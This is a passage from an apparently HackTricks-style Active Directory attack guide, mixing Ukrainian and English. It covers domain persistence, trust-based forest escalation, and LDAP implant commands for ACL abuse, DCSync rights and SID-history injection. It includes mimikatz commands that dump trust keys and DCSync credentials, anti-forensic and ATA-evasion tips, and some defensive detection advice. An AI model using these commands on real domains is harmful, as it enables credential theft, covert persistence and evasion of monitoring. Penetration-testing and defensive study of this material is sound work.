Це як golden tickets, forged так, що **bypasses common golden tickets detection mechanisms.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Мати certificates облікового запису або мати змогу request them** — це дуже хороший спосіб зберегти persistence в обліковому записі користувача (навіть якщо він змінить пароль):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Використання certificates також дає змогу зберігати high privileges всередині домену:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Об'єкт **AdminSDHolder** в Active Directory забезпечує security **privileged groups** (наприклад, Domain Admins і Enterprise Admins), застосовуючи стандартний **Access Control List (ACL)** до цих груп, щоб запобігти unauthorized changes. Однак цю функцію можна abused; якщо attacker змінить ACL AdminSDHolder, щоб надати повний доступ звичайному користувачу, цей користувач отримає широкий контроль над усіма privileged groups. Такий захід безпеки, покликаний захищати, може обернутися проти вас, надаючи unwarranted access, якщо за ним не стежити.

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Усередині кожного **Domain Controller (DC)** існує обліковий запис **local administrator**. Отримавши admin rights на такій машині, можна extracted local Administrator hash за допомогою **mimikatz**. Після цього потрібна зміна registry, щоб **enable the use of this password**, що дозволяє remote access до облікового запису local Administrator.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Ви можете **give** деякі **special permissions** **user** щодо певних domain objects, що дозволить цьому користувачу **escalate privileges in the future**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Security descriptors** використовуються для **store** **permissions**, які **object** має **over** another **object**. Якщо ви можете лише **make** невелику зміну в **security descriptor** об'єкта, ви можете отримати дуже цікаві привілеї щодо цього об'єкта без потреби бути членом privileged group.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Abuse клас `dynamicObject` auxiliary class to create short-lived principals/GPOs/DNS records with `entryTTL`/`msDS-Entry-Time-To-Die`; they self-delete without tombstones, erasing LDAP evidence while leaving orphan SIDs, broken `gPLink` references, or cached DNS responses (e.g., AdminSDHolder ACE pollution or malicious `gPCFileSysPath`/AD-integrated DNS redirects).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Змініть **LSASS** у пам'яті, щоб establish **universal password**, granting access to all domain accounts.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Ви можете створити **own SSP** щоб **capture** у **clear text** credentials, використані для доступу до машини.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Він реєструє **new Domain Controller** в AD і використовує його, щоб **push attributes** (SIDHistory, SPNs...) на вказані об'єкти **without** залишаючи будь-які **logs** щодо **modifications**. Вам **need DA** privileges і потрібно бути в **root domain**.\
Зауважте, що якщо ви використаєте неправильні дані, з'являться дуже неприємні logs.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Раніше ми обговорювали, як підвищити привілеї, якщо у вас є **enough permission to read LAPS passwords**. Однак ці паролі також можна використовувати для **maintain persistence**.\
Перевірте:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft розглядає **Forest** як security boundary. Це означає, що **compromising a single domain could potentially lead to the entire Forest being compromised**.

### Basic Information

[**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) — це security mechanism, що дає користувачу з одного **domain** доступ до ресурсів в іншому **domain**. По суті, вона створює зв'язок між authentication systems двох доменів, дозволяючи authentication verifications проходити безперешкодно. Коли домени налаштовують trust, вони обмінюються і зберігають певні **keys** у своїх **Domain Controllers (DCs)**, які є критично важливими для цілісності trust.

У типовому сценарії, якщо користувач хоче отримати доступ до service в **trusted domain**, він спочатку має запросити спеціальний ticket, відомий як **inter-realm TGT**, у DC свого домену. Цей TGT шифрується спільним **key**, який узгодили обидва домени. Потім користувач пред'являє цей TGT **DC of the trusted domain** щоб отримати service ticket (**TGS**). Після успішної validation inter-realm TGT DC довіреного домену видає TGS, надаючи користувачу доступ до service.

**Steps**:

1. **Client computer** у **Domain 1** запускає процес, використовуючи свій **NTLM hash** для запиту **Ticket Granting Ticket (TGT)** у свого **Domain Controller (DC1)**.
2. DC1 видає новий TGT, якщо клієнт успішно authenticated.
3. Потім клієнт запитує **inter-realm TGT** у DC1, який потрібен для доступу до ресурсів у **Domain 2**.
4. Inter-realm TGT шифрується за допомогою **trust key**, спільного між DC1 і DC2 як частини двостороннього domain trust.
5. Клієнт несе inter-realm TGT до **Domain 2's Domain Controller (DC2)**.
6. DC2 перевіряє inter-realm TGT, використовуючи свій спільний trust key, і, якщо він valid, видає **Ticket Granting Service (TGS)** для сервера в Domain 2, до якого клієнт хоче отримати доступ.
7. Нарешті, клієнт пред'являє цей TGS серверу, який зашифрований hash облікового запису сервера, щоб отримати доступ до service в Domain 2.

### Different trusts

Важливо зазначити, що **a trust can be 1 way or 2 ways**. У 2 ways options обидва домени довіряють один одному, але в **1 way** trust relation один із доменів буде **trusted**, а інший — **trusting**. В останньому випадку, **you will only be able to access resources inside the trusting domain from the trusted one**.

Якщо Domain A trusts Domain B, A є trusting domain, а B — trusted one. Більше того, у **Domain A** це буде **Outbound trust**; а в **Domain B** — **Inbound trust**.

**Different trusting relationships**

- **Parent-Child Trusts**: Це поширена схема в одному forest, де дочірній домен автоматично має двосторонній transitive trust зі своїм батьківським доменом. По суті, це означає, що authentication requests можуть безперешкодно проходити між батьківським і дочірнім доменом.
- **Cross-link Trusts**: Також називаються "shortcut trusts"; вони створюються між дочірніми доменами для пришвидшення referral processes. У складних forests authentication referrals зазвичай мають проходити вгору до forest root, а потім вниз до target domain. Завдяки cross-links шлях скорочується, що особливо корисно в географічно розподілених середовищах.
- **External Trusts**: Вони налаштовуються між різними, непов'язаними доменами і за своєю природою є non-transitive. Згідно з [Microsoft's documentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), external trusts корисні для доступу до ресурсів у домені поза поточним forest, який не з'єднаний forest trust. Безпека посилюється через SID filtering з external trusts.
- **Tree-root Trusts**: Ці trusts автоматично встановлюються між forest root domain і новим tree root, який додається. Хоча їх нечасто зустрічають, tree-root trusts важливі для додавання нових domain trees до forest, даючи їм змогу зберігати унікальне domain name і забезпечуючи двосторонню transitivity. Більше інформації можна знайти в [Microsoft's guide](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Цей тип trust — двосторонній transitive trust між двома forest root domains, який також застосовує SID filtering для посилення security measures.
- **MIT Trusts**: Ці trusts встановлюються з non-Windows, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos domains. MIT trusts є дещо більш спеціалізованими і призначені для середовищ, що потребують інтеграції з Kerberos-based systems поза Windows ecosystem.

#### Other differences in **trusting relationships**

- Trust relationship також може бути **transitive** (A trust B, B trust C, then A trust C) або **non-transitive**.
- Trust relationship can be set up as **bidirectional trust** (both trust each other) or as **one-way trust** (only one of them trust the other).

### Attack Path

1. **Enumerate** trusting relationships
2. Перевірте, чи будь-який **security principal** (user/group/computer) має **access** до ресурсів **other domain**, можливо через ACE entries або через membership у groups іншого домену. Шукайте **relationships across domains** (trust was created for this probably).
1. kerberoast in this case could be another option.
3. **Compromise** **accounts**, які можуть **pivot** through domains.

Attackers з could access до ресурсів в іншому домені через три основні механізми:

- **Local Group Membership**: Principals можуть бути додані до local groups на машинах, таких як група “Administrators” на сервері, що надає їм значний контроль над цією машиною.
- **Foreign Domain Group Membership**: Principals також можуть бути членами groups у foreign domain. Однак ефективність цього методу залежить від nature trust і scope групи.
- **Access Control Lists (ACLs)**: Principals можуть бути вказані в **ACL**, особливо як entities у **ACEs** всередині **DACL**, надаючи їм доступ до specific resources. Для тих, хто хоче глибше зануритися в механіку ACLs, DACLs і ACEs, whitepaper під назвою “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” є безцінним ресурсом.

### Find external users/groups with permissions

Ви можете перевірити **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`**, щоб знайти foreign security principals у домені. Це будуть user/group з **an external domain/forest**.

Ви можете перевірити це в **Bloodhound** або за допомогою powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Підвищення привілеїв у forest з Child-to-Parent
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Інші способи перерахувати domain trusts:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Існують **2 trusted keys**, одна для _Child --> Parent_, а інша для _Parent_ --> _Child_.\
> Ви можете отримати ту, що використовується поточним доменом, за допомогою:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Підвищте привілеї до Enterprise admin у child/parent domain, зловживаючи trust за допомогою SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Розуміння того, як можна використати Configuration Naming Context (NC), є критично важливим. Configuration NC виступає як центральне сховище конфігураційних даних у всьому forest в середовищах Active Directory (AD). Ці дані реплікуються на кожен Domain Controller (DC) у межах forest, а writable DC зберігають записувану копію Configuration NC. Щоб скористатися цим, потрібно мати **SYSTEM privileges на DC**, бажано на child DC.

**Link GPO to root DC site**

Контейнер Sites у Configuration NC містить інформацію про sites усіх комп’ютерів, приєднаних до домену, у AD forest. Діючи з SYSTEM privileges на будь-якому DC, attackers можуть прив’язувати GPO до root DC sites. Це потенційно компрометує root domain через зміну policies, застосованих до цих sites.

Для детальної інформації можна звернутися до дослідження [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Один із векторів attack полягає у націлюванні на privileged gMSA в домені. KDS Root key, необхідний для обчислення passwords gMSA, зберігається в Configuration NC. Маючи SYSTEM privileges на будь-якому DC, можна отримати доступ до KDS Root key і обчислити passwords для будь-якого gMSA у всьому forest.

Детальний аналіз і покрокові інструкції можна знайти в:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Додатковий delegated MSA attack (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Додаткове зовнішнє дослідження: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Цей метод вимагає терпіння, очікуючи на створення нових privileged AD objects. Маючи SYSTEM privileges, attackers можуть змінити AD Schema, щоб надати будь-якому користувачу повний контроль над усіма classes. Це може призвести до несанкціонованого доступу та контролю над новоствореними AD objects.

Докладніше можна прочитати в [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

Уразливість ADCS ESC5 націлена на контроль над Public Key Infrastructure (PKI) objects, щоб створити certificate template, який дозволяє authentication як будь-який користувач у межах forest. Оскільки PKI objects знаходяться в Configuration NC, компрометація writable child DC дає змогу виконувати атаки ESC5.

Більше деталей можна прочитати в [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). У сценаріях без ADCS attacker має можливість налаштувати необхідні компоненти, як описано в [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
У цьому сценарії **ваш домен є довіреним** зовнішнім доменом, що надає вам **невизначені дозволи** над ним. Вам потрібно буде з’ясувати, **які principals вашого домену мають який доступ до зовнішнього домену**, а потім спробувати це експлуатувати:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### External Forest Domain - One-Way (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
У цьому сценарії **your domain** **довіряє** деякі **privileges** principal з **different domains**.

Однак, коли **domain is trusted** довіряючим доменом, trusted domain **створює user** з **predictable name**, який використовує як **password trusted password**. Це означає, що можна **access a user from the trusting domain to get inside the trusted one** щоб перелічити його та спробувати підвищити ще більше privileges:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Інший спосіб скомпрометувати trusted domain — знайти [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links), створений у **opposite direction** domain trust (це трапляється не дуже часто).

Ще один спосіб скомпрометувати trusted domain — дочекатися на машині, де **user from the trusted domain can access** to login via **RDP**. Тоді attacker може інжектити code у процес RDP session і **access the origin domain of the victim** звідти.\
Крім того, якщо **victim mounted his hard drive**, з **RDP session** process attacker може зберігати **backdoors** у **startup folder of the hard drive**. Ця техніка називається **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Domain trust abuse mitigation

### **SID Filtering:**

- Ризик атак, що використовують атрибут SID history через forest trusts, пом’якшується SID Filtering, який увімкнено за замовчуванням для всіх inter-forest trusts. Це базується на припущенні, що intra-forest trusts є безпечними, оскільки Microsoft вважає security boundary саме forest, а не domain.
- Однак є нюанс: SID filtering може порушити роботу applications і доступ user access, що іноді призводить до його вимкнення.

### **Selective Authentication:**

- Для inter-forest trusts використання Selective Authentication гарантує, що users з двох forests не автентифікуються автоматично. Натомість для access до domains і servers у trusting domain або forest потрібні явні permissions.
- Важливо зазначити, що ці заходи не захищають від exploitation writable Configuration Naming Context (NC) або attacks on the trust account.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse from On-Host Implants

[**LDAP BOF Collection**](https://github.com/P0142/LDAP-Bof-Collection) re-implements bloodyAD-style LDAP primitives as x64 Beacon Object Files that run entirely inside an on-host implant (e.g., Adaptix C2). Operators compile the pack with `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, load `ldap.axs`, and then call `ldap <subcommand>` from the beacon. Увесь traffic іде через поточний logon security context over LDAP (389) with signing/sealing або LDAPS (636) with auto certificate trust, тож socks proxies або disk artifacts не потрібні.

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` розв’язують short names/OU paths у full DNs і виводять відповідні objects.
- `get-object`, `get-attribute`, and `get-domaininfo` витягують arbitrary attributes (including security descriptors) плюс forest/domain metadata з `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` показують roasting candidates, delegation settings, and existing [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptors directly from LDAP.
- `get-acl` and `get-writable --detailed` parse DACL, щоб перелічити trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes), and inheritance, даючи негайні targets для ACL privilege escalation.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives for escalation & persistence

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) дозволяють оператору розгортати нових principals або machine accounts там, де існують права на OU. `add-groupmember`, `set-password`, `add-attribute`, and `set-attribute` безпосередньо перехоплюють targets, щойно знайдено write-property права.
- ACL-focused commands such as `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, and `add-dcsync` перетворюють WriteDACL/WriteOwner на будь-якому AD object у скидання паролів, контроль membership у групах або DCSync replication privileges без залишення PowerShell/ADSI artifacts. `remove-*` counterparts очищують injected ACEs.

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn` миттєво роблять compromised user Kerberoastable; `add-asreproastable` (UAC toggle) позначає його для AS-REP roasting без зміни password.
- Delegation macros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) переписують `msDS-AllowedToDelegateTo`, UAC flags, or `msDS-AllowedToActOnBehalfOfOtherIdentity` з beacon, enabling constrained/unconstrained/RBCD attack paths and eliminating the need for remote PowerShell or RSAT.

### sidHistory injection, OU relocation, and attack surface shaping

- `add-sidhistory` injects privileged SIDs into a controlled principal’s SID history (see [SID-History Injection](sid-history-injection.md)), забезпечуючи stealthy access inheritance повністю over LDAP/LDAPS.
- `move-object` changes the DN/OU of computers or users, allowing an attacker drag assets into OUs where delegated rights already exist before abusing `set-password`, `add-groupmember`, or `add-spn`.
- Tightly scoped removal commands (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, etc.) allow rapid rollback after the operator harvests credentials or persistence, minimizing telemetry.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Some General Defenses

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Defensive Measures for Credential Protection**

- **Domain Admins Restrictions**: It is recommended that Domain Admins should only be allowed to login to Domain Controllers, avoiding their use on other hosts.
- **Service Account Privileges**: Services should not be run with Domain Admin (DA) privileges to maintain security.
- **Temporal Privilege Limitation**: For tasks requiring DA privileges, their duration should be limited. This can be achieved by: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Audit Event IDs 2889/3074/3075 and then enforce LDAP signing plus LDAPS channel binding on DCs/clients to block LDAP MITM/relay attempts.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Protocol-level fingerprinting of Impacket activity

If you want to detect common AD tradecraft, **do not rely only on operator-controlled artifacts** such as renamed binaries, service names, temp batch files, or output paths. Baseline how legitimate Windows clients build [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC, and WMI traffic, then look for **implementation quirks** that remain even after the operator edits `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py`, or `ntlmrelayx.py`.

- **High-confidence standalone candidates** (after validating against your own baseline):
- Authenticated DCE/RPC using `auth_context_id = 79231 + ctx_id`
- DCE/RPC authentication padding filled with `0xff`
- LDAP Kerberos binds that place a raw Kerberos `AP-REQ` directly in SPNEGO `mechToken`
- SMB2/3 negotiate requests with ASCII-looking `ClientGuid` values
- WMI `IWbemLevel1Login::NTLMLogin` using the non-standard namespace `//./root/cimv2`
- Hardcoded Kerberos nonce values
- **Better as correlation/scoring features**:
- Sparse or duplicated Kerberos etype lists, unusual/missing `PA-DATA`, or TGS-REQ etype ordering that differs from native Windows
- NTLM Type 1 messages missing version info or Type 3 messages with null host names
- Raw NTLMSSP carried in DCE/RPC instead of SPNEGO, missing DCE/RPC verification trailers, or SPNEGO/Kerberos OID mismatches
- Several of these traits from the same host/user/session/time window are far stronger than any single weak field
- **Use as enrichment, not as standalone alerts**:
- Default filenames, output paths, random service names, temporary batch names, default computer account names, and tool-specific HTTP/WebDAV/RDP/MSSQL strings
- These are easy for operators to change and are best used to explain why a cross-protocol cluster is suspicious
- **Operational notes**:
- Some of these signals require decrypted traffic, [PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW, or service-side visibility
- Validate against Samba/Linux clients, appliances, and legacy software before promoting to alerts
- Promote detections from enrichment -> hunting -> alerting as you build confidence in the baseline

### **Implementing Deception Techniques**

- Implementing deception involves setting traps, like decoy users or computers, with features such as passwords that do not expire or are marked as Trusted for Delegation. A detailed approach includes creating users with specific rights or adding them to high privilege groups.
- A practical example involves using tools like: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- More on deploying deception techniques can be found at [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifying Deception**

- **For User Objects**: Suspicious indicators include atypical ObjectSID, infrequent logons, creation dates, and low bad password counts.
- **General Indicators**: Comparing attributes of potential decoy objects with those of genuine ones can reveal inconsistencies. Tools like [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) can assist in identifying such deceptions.

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Avoiding session enumeration on Domain Controllers to prevent ATA detection.
- **Ticket Impersonation**: Utilizing **aes** keys for ticket creation helps evade detection by not downgrading to NTLM.
- **DCSync Attacks**: Executing from a non-Domain Controller to avoid ATA detection is advised, as direct execution from a Domain Controller will trigger alerts.

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)
- [ThatTotallyRealMyth/Impacket-IoCs – Dissecting Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [rub-softsec/onelogon - Onelogon: Taking over Active Directory Accounts via Netlogon](https://github.com/rub-softsec/onelogon)
- [Microsoft - How to manage the changes in Netlogon secure channel connections associated with CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11ee)

{{#include ../../banners/hacktricks-training.md}}
